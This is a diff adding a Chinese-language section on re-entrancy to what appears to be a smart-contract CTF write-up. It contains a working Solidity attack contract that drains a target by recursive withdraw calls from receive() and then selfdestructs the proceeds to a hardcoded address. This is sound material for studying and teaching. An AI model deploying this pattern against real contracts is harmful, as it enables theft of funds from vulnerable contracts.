@@ -83,3 +83,27 @@ contract Hack {
     }
 }
 ```
+## 11. Re-entrancy
+目标合约的withdraw函数先转账再扣除余额, 引发重入攻击
+攻击合约实现receive函数, 当目标合约的余额大于0时, 可以继续递归调用withdraw函数提取资金
+```solidity
+// 部署合约附带0.001e
+contract Hack {
+    Reentrance r = Reentrance(0xFAe73a7Df5253a2a8b7e32987866c2B157861371);
+
+    constructor() payable public {
+        r.donate{value: msg.value}(address(this));
+    }
+
+    function hack() public {
+        r.withdraw(r.balanceOf(address(this)));
+        selfdestruct(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
+    }
+
+    receive() external payable { 
+        if (address(r).balance > 0) {
+            r.withdraw(r.balanceOf(address(this)));
+        }
+     }
+}
+```
